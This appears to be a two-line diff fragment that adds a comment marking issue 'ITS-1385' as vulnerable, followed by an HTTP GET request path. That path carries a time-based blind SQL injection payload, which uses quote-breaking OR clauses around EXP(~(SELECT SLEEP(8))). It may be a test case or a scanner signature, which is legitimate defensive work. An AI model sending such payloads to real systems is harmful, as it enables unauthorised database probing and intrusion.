@@ -1,0 +1,2 @@
+# Vulnerable: ITS-1385
+GET /x'OR(EXP(~(SELECT*FROM(SELECT(SLEEP(8)))a)))OR'/
